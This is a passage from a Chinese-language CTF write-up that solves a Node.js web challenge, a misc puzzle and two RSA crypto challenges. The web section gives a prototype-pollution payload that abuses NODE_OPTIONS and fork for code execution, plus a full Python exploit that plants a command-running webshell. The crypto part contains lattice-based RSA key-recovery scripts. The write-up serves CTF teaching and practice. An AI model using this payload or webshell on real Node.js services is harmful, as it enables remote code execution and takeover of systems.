</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#66d9ef>const</span> { <span style=color:#a6e22e>clone</span>, <span style=color:#a6e22e>merge</span> } <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;./utils/merge&#39;</span>)
</span></span></code></pre></div><p><code>merge</code> å‡½æ•°åœ¨ <code>/util/merge.js</code> ä¸­ï¼Œè·³è¿‡åä¸º <code>__proto__</code> çš„å±æ€§ï¼Œä»¥é˜²æ­¢åŸå‹é“¾æ±¡æŸ“æ¼æ´ï¼›è·³è¿‡å€¼ä¸ºç©ºå­—ç¬¦ä¸² <code>""</code> çš„å±æ€§ã€‚ä½†æˆ‘ä»¬å¯ä»¥é€šè¿‡ <code>constructor.prototype</code> æ¥ç»•è¿‡é™åˆ¶(<code>constructor.prototype</code> æ˜¯å¯¹è±¡çš„ä¸€ä¸ªå±æ€§ï¼Œå¯ä»¥ç”¨æ¥è®¿é—®å¹¶ä¿®æ”¹å¯¹è±¡çš„åŸå‹ã€‚)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>#</span> <span style=color:#a6e22e>merge</span>.<span style=color:#a6e22e>js</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>let</span> <span style=color:#a6e22e>key</span> <span style=color:#66d9ef>in</span> <span style=color:#a6e22e>source</span>) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>key</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;__proto__&#34;</span>) <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>source</span>[<span style=color:#a6e22e>key</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#34;&#34;</span>) <span style=color:#66d9ef>continue</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isObject</span>(<span style=color:#a6e22e>source</span>[<span style=color:#a6e22e>key</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>key</span> <span style=color:#66d9ef>in</span> <span style=color:#a6e22e>target</span>) {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>target</span>[<span style=color:#a6e22e>key</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>merge</span>(<span style=color:#a6e22e>target</span>[<span style=color:#a6e22e>key</span>], <span style=color:#a6e22e>source</span>[<span style=color:#a6e22e>key</span>]);
</span></span><span style=display:flex><span>        } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>target</span>[<span style=color:#a6e22e>key</span>] <span style=color:#f92672>=</span> <span style=color:#a6e22e>source</span>[<span style=color:#a6e22e>key</span>];
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p><code>/process</code> è·¯ç”±è°ƒç”¨äº† <code>fork</code>ï¼Œåˆ›å»ºäº†ä¸€ä¸ª JavaScript å­è¿›ç¨‹ç”¨äºæ°´å°æ·»åŠ </p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span> <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#66d9ef>new</span> Promise((<span style=color:#a6e22e>resolve</span>, <span style=color:#a6e22e>reject</span>) =&gt; {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>proc</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>fork</span>(<span style=color:#a6e22e>PhotoProcessScript</span>, [<span style=color:#a6e22e>userDir</span>], { <span style=color:#a6e22e>silent</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span> })
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>proc</span>.<span style=color:#a6e22e>on</span>(<span style=color:#e6db74>&#39;close&#39;</span>, (<span style=color:#a6e22e>code</span>) =&gt; {
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>code</span> <span style=color:#f92672>===</span> <span style=color:#ae81ff>0</span>) {
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>resolve</span>(<span style=color:#e6db74>&#39;success&#39;</span>)
</span></span><span style=display:flex><span>                } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>                    <span style=color:#a6e22e>reject</span>(<span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>&#39;An error occurred during execution&#39;</span>))
</span></span><span style=display:flex><span>                }
</span></span><span style=display:flex><span>            })
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>proc</span>.<span style=color:#a6e22e>on</span>(<span style=color:#e6db74>&#39;error&#39;</span>, (<span style=color:#a6e22e>err</span>) =&gt; {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>reject</span>(<span style=color:#66d9ef>new</span> Error(<span style=color:#e6db74>`Failed to start subprocess: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>err</span>.<span style=color:#a6e22e>message</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>))
</span></span><span style=display:flex><span>            })
</span></span><span style=display:flex><span>        })
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>ctx</span>.<span style=color:#a6e22e>body</span> <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>code</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>msg</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;Photos processed successfully&#39;</span>,
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span></code></pre></div><p>å¯ä»¥æ±¡æŸ“ <code>NODE_OPTIONS</code> å’Œ <code>env</code>ï¼Œåœ¨ <code>env</code> ä¸­å†™å…¥æ¶æ„ä»£ç ï¼Œ<code>fork</code> åœ¨åˆ›å»ºå­è¿›ç¨‹æ—¶å°±ä¼šé¦–å…ˆåŠ è½½æ¶æ„ä»£ç ï¼Œä»è€Œå®ç° RCE,ä½†é¢˜ç›®ä¸å‡ºç½‘ï¼Œæ‰€ä»¥éœ€è¦æ¢ä¸€ç§å†™æ³•</p><p>è¿™ç§å†™æ³•åœ¨å¤ç°çš„æ—¶å€™æ²¡æ‰“é€šï¼ŒæŒ‰é“ç†æ˜¯å¯ä»¥çš„å› ä¸ºæœ‰rootæƒé™</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-js data-lang=js><span style=display:flex><span>{<span style=color:#e6db74>&#34;constructor&#34;</span><span style=color:#f92672>:</span> {<span style=color:#e6db74>&#34;prototype&#34;</span><span style=color:#f92672>:</span> {<span style=color:#e6db74>&#34;NODE_OPTIONS&#34;</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;--require /proc/self/environ&#34;</span>, <span style=color:#e6db74>&#34;env&#34;</span><span style=color:#f92672>:</span> { <span style=color:#e6db74>&#34;EVIL&#34;</span><span style=color:#f92672>:</span><span style=color:#e6db74>&#34;console.log(require(\&#34;child_process\&#34;).execSync(\&#34;cp /flag static/script.js\&#34;).toString())//&#34;</span>}}}}
</span></span></code></pre></div><p>å®˜pçš„æ€è·¯å·®ä¸å¤šå†™ä¸ªshellè¿›å»</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> time <span style=color:#f92672>import</span> sleep
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>url <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;http://url:port&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è·å– token</span>
</span></span><span style=display:flex><span><span style=color:#75715e># éšä¾¿å‘é€ç‚¹å›¾ç‰‡è·å– token</span>
</span></span><span style=display:flex><span>files <span style=color:#f92672>=</span> [
</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#39;images&#39;</span>, (<span style=color:#e6db74>&#39;anno.png&#39;</span>, open(<span style=color:#e6db74>&#39;./1.png&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>), <span style=color:#e6db74>&#39;image/png&#39;</span>)),
</span></span><span style=display:flex><span>    (<span style=color:#e6db74>&#39;images&#39;</span>, (<span style=color:#e6db74>&#39;soyo.png&#39;</span>, open(<span style=color:#e6db74>&#39;./2.png&#39;</span>, <span style=color:#e6db74>&#39;rb&#39;</span>), <span style=color:#e6db74>&#39;image/png&#39;</span>))
</span></span><span style=display:flex><span>]
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/upload&#34;</span>, files<span style=color:#f92672>=</span>files)
</span></span><span style=display:flex><span>token <span style=color:#f92672>=</span> res<span style=color:#f92672>.</span>headers<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;Set-Cookie&#39;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>match</span> <span style=color:#f92672>=</span> re<span style=color:#f92672>.</span>search(<span style=color:#e6db74>r</span><span style=color:#e6db74>&#39;token=([a-f0-9\-\.]+)&#39;</span>, token)
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#66d9ef>match</span>:
</span></span><span style=display:flex><span>    token <span style=color:#f92672>=</span> <span style=color:#66d9ef>match</span><span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;[+] token: </span><span style=color:#e6db74>{</span>token<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>headers <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;Cookie&#39;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;token=</span><span style=color:#e6db74>{</span>token<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å†™å…¥ WebShell</span>
</span></span><span style=display:flex><span>webshell <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>const Koa = require(&#39;koa&#39;)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>const Router = require(&#39;koa-router&#39;)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>const app = new Koa()
</span></span></span><span style=display:flex><span><span style=color:#e6db74>const router = new Router()
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>router.get(&#34;/webshell&#34;, async (ctx) =&gt; {
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    const </span><span style=color:#e6db74>{cmd}</span><span style=color:#e6db74> = ctx.query
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    res = require(&#39;child_process&#39;).execSync(cmd).toString()
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    return ctx.body = {
</span></span></span><span style=display:flex><span><span style=color:#e6db74>        res
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    }
</span></span></span><span style=display:flex><span><span style=color:#e6db74>})
</span></span></span><span style=display:flex><span><span style=color:#e6db74>
</span></span></span><span style=display:flex><span><span style=color:#e6db74>app.use(router.routes())
</span></span></span><span style=display:flex><span><span style=color:#e6db74>app.listen(3000, () =&gt; {
</span></span></span><span style=display:flex><span><span style=color:#e6db74>    console.log(&#39;http://127.0.0.1:3000&#39;)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>})
</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å°† WebShell å†…å®¹ Base64 ç¼–ç </span>
</span></span><span style=display:flex><span>encoded_webshell <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(webshell<span style=color:#f92672>.</span>encode())<span style=color:#f92672>.</span>decode()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Base64 è§£ç åå†™å…¥æ–‡ä»¶</span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> {
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;constructor&#34;</span>: {
</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;prototype&#34;</span>: {
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;NODE_OPTIONS&#34;</span>: <span style=color:#e6db74>&#34;--require /proc/self/environ&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;env&#34;</span>: {
</span></span><span style=display:flex><span>                <span style=color:#e6db74>&#34;A&#34;</span>: <span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;require(</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>child_process</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>).execSync(</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>echo </span><span style=color:#e6db74>{</span>encoded_webshell<span style=color:#e6db74>}</span><span style=color:#e6db74> | base64 -d &gt; /app/index.js</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>)//&#34;</span>
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># åŸå‹é“¾æ±¡æŸ“</span>
</span></span><span style=display:flex><span>requests<span style=color:#f92672>.</span>post(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/config&#34;</span>, json<span style=color:#f92672>=</span>payload, headers<span style=color:#f92672>=</span>headers)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è§¦å‘ fork å®ç° RCE</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span>:
</span></span><span style=display:flex><span>    requests<span style=color:#f92672>.</span>post(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/process&#34;</span>, headers<span style=color:#f92672>=</span>headers)
</span></span><span style=display:flex><span><span style=color:#66d9ef>except</span> <span style=color:#a6e22e>Exception</span> <span style=color:#66d9ef>as</span> e:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>pass</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>sleep(<span style=color:#ae81ff>2</span>)
</span></span><span style=display:flex><span><span style=color:#75715e># è®¿é—®æœ‰å›æ˜¾çš„ WebShell</span>
</span></span><span style=display:flex><span>res <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(url <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;/webshell?cmd=cat /flag&#34;</span>)
</span></span><span style=display:flex><span>print(res<span style=color:#f92672>.</span>text)
</span></span></code></pre></div><h2 id=misc-3>misc</h2><h3 id=æ‰«ç é¢†å–flag>æ‰«ç é¢†å–flag</h3><p>hintçœ‹ä¸€ä¸‹é‡Œé¢base64è§£å¯†ï¼Œå¦å¤–ä¸€ä¸ªå›¾ç‰‡crcçˆ†ç ´ä¸€ä¸‹å¾—åˆ°äºŒç»´ç ï¼Œæœç´¢ä¸€ä¸‹å¯¹åº”çš„äºŒç»´ç ç§ç±»å¾—åˆ°flag</p><h2 id=crypto-3>crypto</h2><h3 id=åœ£çŸ³åŒ•é¦–>åœ£çŸ³åŒ•é¦–</h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> gmpy2
</span></span><span style=display:flex><span><span style=color:#f92672>from</span> sage.all <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Parameters</span>
</span></span><span style=display:flex><span>beta <span style=color:#f92672>=</span> <span style=color:#ae81ff>0.37</span>
</span></span><span style=display:flex><span>delta <span style=color:#f92672>=</span> <span style=color:#ae81ff>0.01</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>3668637434348843171145584606519031375027610199908169273169275927238735031431533260375377791001464799116453803408104076615710166171199990283470548282669948353598733020244755959461974603778630346457439345913209321194112256348302765254052193562603687450740346132207444615610078198488883539133291840346099727880587092122957231085658576850601488737629051252914095889313671875244094452330062619943781809984690384476868543570724769198985172300665613239047649089399919032152539462701309393130614829962670866062380816370571057536421400102100259975636785825540933280194583888638501981649650640939392658268133881679239293596283</span>
</span></span><span style=display:flex><span>N <span style=color:#f92672>=</span> <span style=color:#ae81ff>9748523098652101859947730585916490335896800943242955095820326993765071194474558998322598145898741779502734772138283011560029368500998354183150180904846368209977332058847768859238711047784703104535311583123388923571789764758869419482184613566672922481672444028753365755071127320541645016370072493604532087980626825687519083734367691341907014061379844209864141989961751681235215504772582878202048494707090104738899927036896915997556102574747166491969027546256022019959716418675672979328622656831990050058120299353807110233202113906317969377201045402271911946244076903611612303290556012512559696538977841061277173754331</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>5374936627659221745209010619827617207565185520404653329184605916859755641352457088986635357806048863755173540232471505333583684733535121482637476692432365062808450583470788320547816186936317927449796090525477205337038591439577855884910604383190932340306435201976465543731935147881754136301375206828970248293731391543905441514528959500307972606931927112031018356411970001312995489429650903529877904694901310020882390008248466887950986326522740278880600110217817950511478637493101027659292006016454642135508207492151610829525082829566392116546434101694921106423469015683277992978077101831969525458693031031468092418427</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Calculate n and m</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> round((<span style=color:#ae81ff>1</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2</span><span style=color:#f92672>*</span>beta<span style=color:#f92672>-</span><span style=color:#ae81ff>2</span><span style=color:#f92672>*</span>delta)<span style=color:#f92672>/</span>((<span style=color:#ae81ff>1</span><span style=color:#f92672>-</span>beta)<span style=color:#f92672>**</span><span style=color:#ae81ff>2</span><span style=color:#f92672>-</span><span style=color:#ae81ff>2</span><span style=color:#f92672>*</span>delta<span style=color:#f92672>-</span>beta), <span style=color:#ae81ff>6</span>)
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> (<span style=color:#ae81ff>1</span><span style=color:#f92672>-</span>beta) <span style=color:#f92672>*</span> n
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;m = </span><span style=color:#e6db74>{</span>m<span style=color:#e6db74>}</span><span style=color:#e6db74>, n = </span><span style=color:#e6db74>{</span>n<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Round n up to the nearest integer and convert m to an integer</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> int(n <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> int(m)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Calculate X and Y</span>
</span></span><span style=display:flex><span>X <span style=color:#f92672>=</span> int(pow(N, delta))
</span></span><span style=display:flex><span>Y <span style=color:#f92672>=</span> int(pow(N, delta<span style=color:#f92672>+</span>beta))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Set up the polynomial ring</span>
</span></span><span style=display:flex><span>Z<span style=color:#f92672>.&lt;</span>x,y<span style=color:#f92672>&gt;</span> <span style=color:#f92672>=</span> ZZ[]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Create the lattice</span>
</span></span><span style=display:flex><span>L <span style=color:#f92672>=</span> Matrix(ZZ, n, n)
</span></span><span style=display:flex><span>f <span style=color:#f92672>=</span> e<span style=color:#f92672>*</span>x <span style=color:#f92672>-</span> y
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(n):
</span></span><span style=display:flex><span>    g <span style=color:#f92672>=</span> list(N<span style=color:#f92672>**</span>max(<span style=color:#ae81ff>0</span>,m<span style=color:#f92672>-</span>i) <span style=color:#f92672>*</span> x<span style=color:#f92672>**</span>(n<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span>i) <span style=color:#f92672>*</span> f<span style=color:#f92672>**</span>i)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(len(g)):
</span></span><span style=display:flex><span>        L[i,j] <span style=color:#f92672>=</span> g[j][<span style=color:#ae81ff>0</span>] <span style=color:#f92672>*</span> X<span style=color:#f92672>**</span>(n<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span>j) <span style=color:#f92672>*</span> Y<span style=color:#f92672>**</span>j
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Apply LLL algorithm</span>
</span></span><span style=display:flex><span>L <span style=color:#f92672>=</span> L<span style=color:#f92672>.</span>LLL()[<span style=color:#ae81ff>0</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Reconstruct the polynomial</span>
</span></span><span style=display:flex><span>coeff <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(n):
</span></span><span style=display:flex><span>    coeff<span style=color:#f92672>.</span>append((L[i]<span style=color:#f92672>//</span>(X<span style=color:#f92672>**</span>(n<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span>i)<span style=color:#f92672>*</span>Y<span style=color:#f92672>**</span>i), <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;x**</span><span style=color:#e6db74>{</span>n<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span><span style=color:#f92672>-</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>*y**</span><span style=color:#e6db74>{</span>i<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span>))
</span></span><span style=display:flex><span>s <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;+&#39;</span><span style=color:#f92672>.</span>join([<span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;</span><span style=color:#e6db74>{</span>c[<span style=color:#ae81ff>0</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>*</span><span style=color:#e6db74>{</span>c[<span style=color:#ae81ff>1</span>]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;</span> <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> coeff])
</span></span><span style=display:flex><span>f <span style=color:#f92672>=</span> eval(s)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Factor the polynomial</span>
</span></span><span style=display:flex><span>factored_f <span style=color:#f92672>=</span> f<span style=color:#f92672>.</span>factor()
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>&#34;Factored polynomial:&#34;</span>, factored_f)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Extract the linear factor (if exists)</span>
</span></span><span style=display:flex><span>linear_factor <span style=color:#f92672>=</span> next((factor <span style=color:#66d9ef>for</span> factor, _ <span style=color:#f92672>in</span> factored_f <span style=color:#66d9ef>if</span> factor<span style=color:#f92672>.</span>degree() <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span>), <span style=color:#66d9ef>None</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> linear_factor:
</span></span><span style=display:flex><span>    <span style=color:#75715e># Extract k and dp from the linear factor</span>
</span></span><span style=display:flex><span>    k <span style=color:#f92672>=</span> abs(linear_factor<span style=color:#f92672>.</span>coefficients()[<span style=color:#ae81ff>0</span>]) <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    dp <span style=color:#f92672>=</span> abs(linear_factor<span style=color:#f92672>.</span>coefficients()[<span style=color:#ae81ff>1</span>])
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Calculate p and q</span>
</span></span><span style=display:flex><span>    p <span style=color:#f92672>=</span> (e <span style=color:#f92672>*</span> dp <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>//</span> k <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>    q <span style=color:#f92672>=</span> N <span style=color:#f92672>//</span> p
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Possible p: </span><span style=color:#e6db74>{</span>p<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Possible q: </span><span style=color:#e6db74>{</span>q<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#75715e># Verify if p and q are correct</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> p <span style=color:#f92672>*</span> q <span style=color:#f92672>==</span> N:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Successfully factored N!&#34;</span>)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e># Calculate private key d</span>
</span></span><span style=display:flex><span>        phi <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
</span></span><span style=display:flex><span>        d <span style=color:#f92672>=</span> int(gmpy2<span style=color:#f92672>.</span>invert(e, phi))
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;Private key d: </span><span style=color:#e6db74>{</span>d<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e># Decrypt the message</span>
</span></span><span style=display:flex><span>        m <span style=color:#f92672>=</span> pow(c, d, N)
</span></span><span style=display:flex><span>        plaintext <span style=color:#f92672>=</span> bytes<span style=color:#f92672>.</span>fromhex(hex(m)[<span style=color:#ae81ff>2</span>:])
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Decrypted message:&#34;</span>, plaintext)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>        print(<span style=color:#e6db74>&#34;Failed to factor N correctly.&#34;</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;No linear factor found. The attack might have failed.&#34;</span>)
</span></span></code></pre></div><h3 id=æ¬§æ‹‰æ¬§æ‹‰>æ¬§æ‹‰æ¬§æ‹‰ï¼ï¼</h3><p>å‘ç°å¯¹nå¯ä»¥ç›´æ¥ç”¨factordbåˆ†è§£</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> Crypto.Util.number <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> <span style=color:#ae81ff>1523365295049608852447528761114036169506740936697335552555682720997896170562682523843468707748630306876516559528314335864164090878934605899152321495370201</span>
</span></span><span style=display:flex><span>n <span style=color:#f92672>=</span> <span style=color:#ae81ff>18104347461003907895610914021247683508445228187648940019610703551961828343286923443588324205257353157349226965840638901792059481287140055747874675375786201782262247550663098932351593199099796736521757473187142907551498526346132033381442243277945568526912391580431142769526917165011590824127172120180838162091</span>
</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>14859652090105683079145454585893160422247900801288656111826569181159038438427898859238993694117308678150258749913747829849091269373672489350727536945889312021893859587868138786640133976196803958879602927438349289325983895357127086714561807181967380062187404628829595784290171905916316214021661729616120643997</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>q <span style=color:#f92672>=</span> n <span style=color:#f92672>//</span> p
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> isPrime(q):
